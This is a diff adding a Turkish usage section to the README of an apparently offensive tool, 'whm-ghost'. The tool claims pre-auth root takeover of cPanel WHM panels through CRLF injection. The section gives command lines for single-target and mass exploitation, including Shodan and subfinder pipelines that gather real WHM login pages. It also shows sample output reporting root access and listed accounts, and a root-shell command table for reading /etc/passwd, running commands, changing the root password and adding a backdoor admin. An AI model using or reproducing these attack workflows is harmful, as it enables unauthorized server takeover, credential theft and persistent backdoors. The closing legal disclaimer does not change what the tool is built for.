@@ -52,3 +52,67 @@ Yalnızca **Python 3.6+** gerektirir, hiçbir harici paket kurulmaz.
 git clone https://github.com/arsenik/whm-ghost.git
 cd whm-ghost
 python3 whm_ghost.py -u https://hedef.com:2087
+Kullanım
+Parametre	Açıklama
+-u, --url	Tek hedef URL
+-l, --list	Hedef listesi dosyası
+-t, --threads	İş parçacığı (varsayılan 10)
+--timeout	İstek zaman aşımı (sn, varsayılan 15)
+--shell	Başarılı exploit sonrası direkt root shell
+-o, --output	Sonuçları JSON'a kaydet
+--no-color	Renkleri kapat
+Çalışma Senaryoları
+
+# Tek hedef – tam otomatik
+python3 whm_ghost.py -u https://panel.example.com:2087
+
+# Başarılıysa root shell aç
+python3 whm_ghost.py -u https://panel.example.com:2087 --shell
+
+# Dosyadaki listeden toplu tarama + rapor
+python3 whm_ghost.py -l sunucular.txt -t 20 -o rapor.json
+
+# Pipeline ile canlı hedefler
+subfinder -d example.com | httpx -p 2087 -silent | python3 whm_ghost.py -t 30
+
+# Shodan entegrasyonu
+shodan search --fields ip_str,port 'title:"WHM Login"' \
+  | awk '{print "https://"$1":"$2}' | python3 whm_ghost.py
+
+Canlı Ekran Görüntüsü
+
+[14:23:10] [ℹ] Taranıyor: https://demo.cpanel.net:2087
+[14:23:11] [▶] Stage 0 – Canonical host: server1
+[14:23:11] [▶] Stage 1 – Preauth session alındı
+[14:23:12] [▶] Stage 2 – CRLF enjeksiyonu başarılı
+[14:23:12] [▶] Stage 3 – Propagasyon tetiklendi
+[14:23:13] [▶] Stage 4 – Root doğrulandı ✅
+[14:23:13] [☠] BAŞARILI! Sürüm: 11.102.0.34
+[14:23:13] [✓] Keşif: 12 hesap
+
+═══ WHM GHOST ═══
+[1] https://demo.cpanel.net:2087
+   Sürüm: 11.102.0.34  Hostname: server1.example.com
+   Hesaplar: 12 adet
+   Kullanıcılar: user1, user2, admin, test...
+   API: https://demo.cpanel.net:2087/cpsess1234567890/json-api/version
+
+Root Shell Komutları
+Komut	İşlev
+help	Komut listesi
+accounts	cPanel hesaplarını listele
+info	Sunucu bilgisi (hostname, disk, yük)
+cat /etc/passwd	Dosya oku
+exec id	Sistem komutu çalıştır
+passwd YeniSifre	Root parolasını değiştir
+addadmin user pass	Backdoor admin ekle
+exit	Shell'den çık
+Yasal Uyarı
+Bu araç yalnızca yetkili penetrasyon testleri ve eğitim amaçlıdır.
+İzinsiz kullanım yasadışıdır. Geliştirici (Arsenik) sorumluluk kabul etmez.
+
+A
+
+
+
+
